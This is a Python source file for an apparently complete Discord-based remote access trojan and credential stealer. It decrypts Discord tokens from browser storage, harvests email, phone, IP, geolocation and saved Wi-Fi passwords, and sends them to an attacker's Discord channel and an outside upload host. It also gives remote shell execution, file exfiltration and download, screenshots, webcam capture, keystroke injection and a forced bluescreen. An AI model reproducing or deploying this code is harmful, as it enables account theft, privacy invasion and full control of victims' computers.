import discord
import os
import subprocess
import requests
import pyautogui
import ctypes
import asyncio
import sys
from datetime import datetime
from uuid import getnode as get_mac
from settings import *
from cv2 import VideoCapture, imwrite, CAP_DSHOW
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from os import getlogin, listdir
from json import loads
from re import findall
from urllib.request import Request, urlopen
from subprocess import Popen, PIPE
import requests, json, os
from datetime import datetime

file_api = "https://api.letsupload.cc/upload"
wifi_script = """(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ SSID=$name;PASSWORD=$pass }} | Format-Table -AutoSize"""

tokens = []
cleaned = []
checker = []
def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except: pass
    return ip

def get_token():
    already_check = []
    checker = []
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    chrome = local + "\\Google\\Chrome\\User Data"
    paths = {
        'Discord': roaming + '\\discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Lightcord': roaming + '\\Lightcord',
        'Discord PTB': roaming + '\\discordptb',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
        'Amigo': local + '\\Amigo\\User Data',
        'Torch': local + '\\Torch\\User Data',
        'Kometa': local + '\\Kometa\\User Data',
        'Orbitum': local + '\\Orbitum\\User Data',
        'CentBrowser': local + '\\CentBrowser\\User Data',
        '7Star': local + '\\7Star\\7Star\\User Data',
        'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
        'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
        'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
        'Chrome': chrome + 'Default',
        'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Defaul',
        'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Iridium': local + '\\Iridium\\User Data\\Default'
    }
    for platform, path in paths.items():
        if not os.path.exists(path): continue
        try:
            with open(path + f"\\Local State", "r") as file:
                key = loads(file.read())['os_crypt']['encrypted_key']
                file.close()
        except: continue
        for file in listdir(path + f"\\Local Storage\\leveldb\\"):
            if not file.endswith(".ldb") and file.endswith(".log"): continue
            else:
                try:
                    with open(path + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
                        for x in files.readlines():
                            x.strip()
                            for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                                tokens.append(values)
                except PermissionError: continue
        for i in tokens:
            if i.endswith("\\"):
                i.replace("\\", "")
            elif i not in cleaned:
                cleaned.append(i)
        for token in cleaned:
            try:
                tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
            except IndexError == "Error": continue
            checker.append(tok)
            for value in checker:
                if value not in already_check:
                    already_check.append(value)
                    headers = {'Authorization': tok, 'Content-Type': 'application/json'}
                    try:
                        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
                    except: continue
                    if res.status_code == 200:
                        res_json = res.json()
                        ip = getip()
                        pc_username = os.getenv("UserName")
                        pc_name = os.getenv("COMPUTERNAME")
                        email = res_json['email']
                        phone = res_json['phone']
                        mfa_enabled = res_json['mfa_enabled']
                        has_nitro = False
                        res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
                        nitro_data = res.json()
                        has_nitro = bool(len(nitro_data) > 0)
                        global grabembed
                        output = subprocess.Popen(["powershell.exe", wifi_script], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE).communicate()[0]
                        decoded_wifi_pwd = output.decode(sys.stdout.encoding, errors='ignore')
                        file_name = f"SSID_{mac_address}.txt"
                        with open(file_name, 'w') as file:
                            file.write(decoded_wifi_pwd)
                        SSIDlink = requests.post(file_api, files={"file": open(file_name, "rb")}).json()["data"]["file"]["url"]["full"]
                        os.remove(file_name)
                        response = requests.get('https://ipapi.co/json/')
                        data = response.json()
                        city = data.get('city')
                        country = data.get('country')
                        latitude = data.get('latitude')
                        longitude = data.get('longitude')
                        username = os.getlogin()

                        grabembed=discord.Embed(title="**Grabbed info from: ** ```" + pc_username +"```",colour=0x3)
                        grabembed.set_author(name="STAR THIS PROJECT ON MY GITHUB NOW!", url="https://github.com/isaaclins/SlytherCord",icon_url="https://cdn.discordapp.com/attachments/1114528537093865494/1128962359562621009/ogkush.png")
                        grabembed.add_field(name="**Token:**",value=f"```{tok}```",inline=True)
                        
                        grabembed.add_field(name="**Email:**",value=f"```{email}```",inline=True)
                        grabembed.add_field(name="**Username:**",value=f"```{pc_username}```",inline=True)
                        grabembed.add_field(name="**PC Name:**",value=f"```{pc_name}```",inline=True)
                        grabembed.add_field(name="**Phone number:**", value=f"```{phone}```",inline=True)
                        grabembed.add_field(name="**MFA Enabled?**", value=f"```{mfa_enabled}```",inline=True)
                        grabembed.add_field(name="**has nitro?**", value=f"```{has_nitro}```",inline=True)
                        grabembed.add_field(name="**IP Address:**",value=f"```{ip}```",inline=True)
                        grabembed.add_field(name="**Country:**", value=f"```{country}```",inline=True)
                        grabembed.add_field(name="**Aprox. Latitude:**", value=f"```{latitude}```",inline=True)
                        grabembed.add_field(name="**Aprox. Longitude**",value=f"```{longitude}```",inline=True)
                        grabembed.add_field(name="**City:**",value=f"```{city}```",inline=True)
                        grabembed.add_field(name="**Username:**",value=f"```{username}```",inline=True)
                        grabembed.add_field(name="**SSID & Passwords:**",value=f"{SSIDlink}",inline=True)
                        
                        grabembed.set_image(url="https://cdn.discordapp.com/emojis/962763241170284554.gif?size=128&quality=lossless")
                        grabembed.set_thumbnail(url="https://cdn.discordapp.com/emojis/824891158936682506.gif?size=128&quality=lossless")
                        grabembed.set_footer(text="Made by: Isaaclins",icon_url="https://cdn.discordapp.com/emojis/696329906749177856.gif?size=128&quality=lossless")
                        grabembed.timestamp = datetime.utcnow()
                else: continue
new_ascii = """ 

 .d8888b.  888          888    888                        .d8888b.                       888 
d88P  Y88b 888          888    888                       d88P  Y88b                      888 
Y88b.      888          888    888                       888    888                      888 
 "Y888b.   888 888  888 888888 88888b.   .d88b.  888d888 888         .d88b.  888d888 .d88888 
    "Y88b. 888 888  888 888    888 "88b d8P  Y8b 888P"   888        d88""88b 888P"  d88" 888 
      "888 888 888  888 888    888  888 88888888 888     888    888 888  888 888    888  888 
Y88b  d88P 888 Y88b 888 Y88b.  888  888 Y8b.     888     Y88b  d88P Y88..88P 888    Y88b 888 
 "Y8888P"  888  "Y88888  "Y888 888  888  "Y8888  888      "Y8888P"   "Y88P"  888     "Y88888 
                    888                                                                      
               Y8b d88P                                                                      
                "Y88P"  -Made by Isaaclins

    Usage:
    .help               - Shows this message
    .ping               - latency delay of the bot
    .cd <directory>     - Change Directory   
    .ls                 - List Directory
    .export <file>      - export File into link
    .upload <link>      - Upload File from link
    .cmd <cmd>          - Execute CMD Command 
    .run <file>         - Run an File   
    .screenshot OR .ss  - Take a Screenshot of the first monitor
    .blue               - sends a bluescreen ;)
    .start              - Adds the bot to the startup directory
    .exit               - closes the connection to the bot  
    .restart            - restarts the connection to the bot                                           
"""
commands = "\n".join([
    ".help               - Shows this message",
    ".ping               - latency delay of the bot",
    ".cd <directory>     - Change Directory",
    ".ls                 - List Directory",
    ".export <file>      - export File into link",
    ".upload <link>      - Upload File from link",
    ".cmd <cmd>          - Execute CMD Command",
    ".run <file>         - Run an File",
    ".ss                 - Take a Screenshot of the first monitor",
    ".blue               - sends a bluescreen ;)",
    ".start              - Adds the bot to the startup directory",
    ".exit               - closes the connection to the bot",
    ".restart            - restarts the connection to the bot"
])
intents = discord.Intents.all()
intents.members = True
client = discord.Client(intents=intents)
async def find_channel_by_name(guild, channel_name):
    for channel in guild.channels:
        if channel.name == channel_name:
            return channel
    return None
async def restart_program():
    python = sys.executable
    script = os.path.abspath(__file__)
    subprocess.call([python, script])
    sys.exit()
def decrypt(buff, master_key):
    try:
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except:
        return "Error"
global mac_address
mac_address = str(get_mac())
@client.event
async def on_ready():
    get_token()
    guild = client.get_guild(int(guild_id))
    channel = await find_channel_by_name(guild, mac_address)
    if channel:
        await channel.send(embed=grabembed)
    else:
        print("Channel with name {} does not exist. Creating...".format(mac_address))
        channel = await guild.create_text_channel(mac_address)
        e = await channel.send(embed=grabembed)
        await e.pin()
@client.event
async def on_message(message):
    guild = client.get_guild(int(guild_id))
    channel = await find_channel_by_name(guild, mac_address)
    if message.author != client.user:    
        if message.channel.name == mac_address: 
            
            match message.content.lower():
                case ".help":
                    embed = discord.Embed(title="Help", description=f"```{commands}```", color=0xfafafa)
                    await message.reply(embed=embed)
                case ".ping":
                    await message.reply(f"Pong! \n jk heres the latency: \n``{round(client.latency * 1000)}ms``")
                case ".ls":
                    files = "\n".join(os.listdir())
                    if files == "":
                        files = "No Files Found"
                    embed = discord.Embed(title=f"Files > {os.getcwd()}", description=f"```{files}```", color=0xfafafa)
                    await message.reply(embed=embed)  
                case ".exit":
                    new_msg = await message.reply("Are you sure you want to destroy the connection?")
                    await new_msg.add_reaction("✅")
                    await new_msg.add_reaction("❌")
                    def check(reaction, user):
                        return user == message.author and str(reaction.emoji) in ["✅", "❌"]

                    try:
                        reaction, user = await client.wait_for('reaction_add', timeout=60, check=check)
                        if str(reaction.emoji) == "✅":
                           await message.channel.delete()
                           await client.close()
                        elif str(reaction.emoji) == "❌":
                            delmsg =await message.channel.send("Cancelled.")
                            await message.delete()
                            await new_msg.delete()
                            await delmsg.delete()
                    except asyncio.TimeoutError:
                        await message.channel.send("You didn't react in time.")
                case ".blue":
                    new_msg = await message.reply("Are you sure you want to start a bluescreen?")
                    await new_msg.add_reaction("✅")
                    await new_msg.add_reaction("❌")

                    def check(reaction, user):
                        return user == message.author and str(reaction.emoji) in ["✅", "❌"]

                    try:
                        reaction, user = await client.wait_for('reaction_add', timeout=60, check=check)
                        if str(reaction.emoji) == "✅":
                            await message.reply("Attempting...", delete_after = .1)
                            ntdll = ctypes.windll.ntdll
                            prev_value = ctypes.c_bool()
                            res = ctypes.c_ulong()
                            ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
                            if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
                                await message.reply("Blue Successful!")
                            else:
                                await message.reply("Blue Failed! :(")
                        elif str(reaction.emoji) == "❌":
                            delmsg =await message.channel.send("Cancelled bluescreen.")
                            await message.delete()
                            await new_msg.delete()
                            await delmsg.delete()
                    except asyncio.TimeoutError:
                        await message.channel.send("You didn't react in time.")
                case ".ss":
                    screenshot = pyautogui.screenshot()
                    path = os.path.join(os.getenv("TEMP"), "screenshot.png")
                    screenshot.save(path)
                    file = discord.File(path)
                    embed = discord.Embed(title="Screenshot", color=0xfafafa)
                    embed.set_image(url="attachment://screenshot.png")
                    await channel.send(embed=embed, file=file) 
                    await message.delete()
                case ".screenshot":
                    screenshot = pyautogui.screenshot()
                    path = os.path.join(os.getenv("TEMP"), "screenshot.png")
                    screenshot.save(path)
                    file = discord.File(path)
                    embed = discord.Embed(title="Screenshot", color=0xfafafa)
                    embed.set_image(url="attachment://screenshot.png")
                    await channel.send(embed=embed, file=file) 
                    await message.delete()
                case ".photo":
                    webcam = VideoCapture(0, CAP_DSHOW)
                    result, image = webcam.read()
                    imwrite('webcam.png', image)
                    await message.channel.send(embed=discord.Embed(title=' `[Image of User with ID:' +mac_address+'`]' ).set_image(url='attachment://webcam.png'), file=discord.File('webcam.png'))
                    subprocess.run('del webcam.png', shell=True)
                    await message.delete()
                case ".purge":  
                    await message.reply('Purging...')
                    await message.channel.purge(limit=None) 
                case ".restart":
                    new_msg = await message.reply("Are you sure you want to restart the connection?")
                    await new_msg.add_reaction("✅")
                    await new_msg.add_reaction("❌")
                    def check(reaction, user):
                        return user == message.author and str(reaction.emoji) in ["✅", "❌"]

                    try:
                        reaction, user = await client.wait_for('reaction_add', timeout=60, check=check)
                        if str(reaction.emoji) == "✅":
                           await message.channel.send("Restarting, please be patient...", delete_after =.5)
                           loadingscreen = await message.channel.send("https://cdn.discordapp.com/emojis/697961731099590787.gif?size=128&quality=lossless")
                           await restart_program()
                           await loadingscreen.delete()
                           
                           await client.close()
                        elif str(reaction.emoji) == "❌":
                            delmsg =await message.channel.send("Cancelled.")
                            await message.delete()
                            await new_msg.delete()
                            await delmsg.delete()
                    except asyncio.TimeoutError:
                        await message.channel.send("You didn't react in time.")             
            if message.content.lower().startswith(".export"):
                file = message.content[8:]
                try:
                    link = requests.post(file_api, files={"file": open(file, "rb")}).json()["data"]["file"]["url"]["full"]
                    embed = discord.Embed(title="Export", description=f"```{link}```", color=0xfafafa)
                    await message.reply(embed=embed)
                except:
                    embed = discord.Embed(title="Error", description=f"```File Not Found```", color=0xfafafa)
                    await message.reply(embed=embed)
            elif message.content.lower().startswith(".upload"):
                link = message.content[8:]
                file = requests.get(link).content
                file_name = os.path.basename(link)
                file_name = file_name.rsplit('_', 1)[0] + '.' + file_name.rsplit('_', 1)[1]
                with open(file_name, "wb") as f:
                    f.write(file)
                embed = discord.Embed(title="Upload", description=f"```{file_name}```", color=0xfafafa)
                await message.reply(embed=embed)
                await message.delete()
            elif message.content.lower().startswith(".shell"):
                command = message.content[7:]
                output = subprocess.Popen(
                    ["powershell.exe", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE
                ).communicate()[0].decode("utf-8")
                if output == "":
                    output = "No output"
                embed = discord.Embed(title=f"Shell > {os.getcwd()}", description=f"```{output}```", color=0xfafafa)
                await message.reply(embed=embed)
                await message.delete()
            elif message.content.lower().startswith(".run"):
                file = message.content[5:]
                output = subprocess.Popen(file, shell=True)
                embed = discord.Embed(title="Started", description=f"```{output}```", color=0xfafafa)
                await message.reply(embed=embed)
                await message.delete()
            elif message.content.lower().startswith(".cd"):
                directory = message.content[4:]
                try:
                    os.chdir(directory)
                    files = "\n".join(os.listdir())
                    if files == "":
                        files = "No Files Found"
                    embed = discord.Embed(title=f"Changed Directory > {os.getcwd()}", description=f"```{files}```", color=0xfafafa)
                except:
                    embed = discord.Embed(title="Error", description=f"```Directory Not Found```", color=0xfafafa)
                await message.reply(embed=embed)
                await message.delete()
            elif message.content.lower().startswith(".input"):
                command = message.content[7:].split()
                key1 = command[0]
                key2 = command[1] if len(command) > 1 else ""
                key3 = command[2] if len(command) > 2 else ""

                keys = [key1, key2, key3]
                hotkey = "+".join(keys)
                print(hotkey)
                try:
                    pyautogui.hotkey(*keys)
                    print(*keys)
                    await channel.send("Sent keystroke: " + str(keys))
                    await message.delete()
                except Exception as e:
                    await channel.send("Failed to send keystroke: " + hotkey + "\nError: " + str(e))
                    await message.delete()
    else:
        print("MESSAGE SENT WAS:", message.content, "BY :" , message.author,"IN :" , message.channel,)

client.run(bot_token)